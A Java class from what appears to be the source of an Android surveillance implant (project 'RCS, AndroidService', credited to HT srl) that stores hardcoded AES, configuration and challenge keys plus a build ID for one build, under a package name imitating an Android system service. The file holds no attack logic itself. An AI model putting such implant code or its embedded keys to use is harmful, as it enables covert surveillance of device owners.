/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : KeysFake.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.crypto;

import com.android.service.util.Utils;

/**
 * The Class KeysFake.
 */
public class KeysFake extends Keys {
	
	// RCS 816 su castore
	byte[] AesKey = Utils.hexStringToByteArray("43ddcdb58f42216465e0bad6a0e9214f61432db5bf3c2b11e76d11d6a5efbf3c", 0, 32);
	byte[] ConfKey = Utils.hexStringToByteArray("49d1e153429bdc361a0aa842625c0aee69d8882ad71f9c354cb04d5fa6c8c755", 0, 32);
	byte[] ChallengeKey = Utils.hexStringToByteArray("572ebc94391281ccf53a851330bb0d992c237a0ffbb0c079281236da8ac5f462", 0, 32);
	byte[] InstanceId = Utils.hexStringToByteArray("00112233445566778899AABBCCDDEEFF00112233");
	String BuildId = "RCS_0000000816";

	public KeysFake() {
		super(false);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getAesKey()
	 */
	@Override
	public byte[] getAesKey() {
		return AesKey;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getChallengeKey()
	 */
	@Override
	public byte[] getChallengeKey() {
		return ChallengeKey;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getConfKey()
	 */
	@Override
	public byte[] getConfKey() {
		return ConfKey;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getInstanceId()
	 */
	@Override
	public byte[] getInstanceId() {
		return InstanceId;
	}
	
	/*
	 * public byte[] getInstanceId() { return g_InstanceId; }
	 */

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getBuildId()
	 */
	@Override
	public byte[] getBuildId() {
		return BuildId.getBytes();
	}
}
